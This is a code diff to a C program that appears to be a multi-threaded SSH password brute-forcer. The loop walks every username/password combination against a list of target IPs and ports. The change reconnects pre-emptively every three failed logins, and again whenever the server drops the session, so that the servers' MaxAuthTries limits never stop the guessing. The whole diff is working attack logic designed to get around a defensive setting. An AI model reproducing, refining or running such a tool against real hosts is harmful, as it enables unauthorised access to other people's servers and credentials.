@@ -212,6 +212,14 @@ static void close_session(rawssh_session *ses) {
     rawssh_session_free(ses);
 }
 
+/*
+ * Preemptive reconnect every AUTH_PER_CONN failed auths.
+ * Most SSH servers have MaxAuthTries=3..6. Instead of waiting
+ * for the server to disconnect us (slow + wastes a round-trip),
+ * we proactively close and reopen the session.
+ */
+#define AUTH_PER_CONN 3
+
 static void process(int idx) {
     Target *t = &g_targets[idx];
     atomic_fetch_add(&G_active, 1);
@@ -226,10 +234,26 @@ static void process(int idx) {
 
     int combo = 0;
     int total = NU * NP;
-    int max_reconn = 50;
-    int reconn = 0;
+    int errs = 0;        /* consecutive unexpected errors */
+    int auth_count = 0;  /* failed auths on current connection */
 
     while (combo < total) {
+        /* Preemptive reconnect before server kicks us */
+        if (auth_count >= AUTH_PER_CONN) {
+            close_session(ses);
+            ses = open_session(t->ip, t->port);
+            if (!ses) {
+                /* Retry once after brief backoff */
+                usleep(50000);
+                ses = open_session(t->ip, t->port);
+                if (!ses) {
+                    sem_post(&g_sem);
+                    goto done;
+                }
+            }
+            auth_count = 0;
+        }
+
         int u = combo / NP;
         int p = combo % NP;
         atomic_fetch_add(&G_tested, 1);
@@ -258,28 +282,45 @@ static void process(int idx) {
         }
 
         if (rc == RAWSSH_AUTH_FAIL) {
-            /* Wrong password - try next combo on same session */
+            /* Wrong password - advance to next combo */
             atomic_fetch_add(&G_wrong, 1);
             combo++;
+            auth_count++;
+            errs = 0; /* connection is healthy */
             continue;
         }
 
-        /* Session died (CLOSED/TCP_ERROR/TIMEOUT/PROTO_ERROR) */
-        atomic_fetch_add(&G_sess_err, 1);
+        /* Session died unexpectedly */
         close_session(ses);
         ses = NULL;
 
-        if (++reconn >= max_reconn) {
+        if (rc == RAWSSH_CLOSED) {
+            /* Server disconnect (e.g. MaxAuthTries) - just reconnect */
+            ses = open_session(t->ip, t->port);
+            if (!ses) {
+                sem_post(&g_sem);
+                goto done;
+            }
+            auth_count = 0;
+            /* retry same combo */
+            continue;
+        }
+
+        /* Real error (timeout, TCP, proto) */
+        atomic_fetch_add(&G_sess_err, 1);
+        if (++errs >= 5) {
+            /* Too many consecutive errors on this target - skip it */
             sem_post(&g_sem);
             goto done;
         }
 
-        /* Reconnect and retry this combo */
         ses = open_session(t->ip, t->port);
         if (!ses) {
             sem_post(&g_sem);
             goto done;
         }
+        auth_count = 0;
+        /* retry same combo on new session */
     }
 
     close_session(ses);
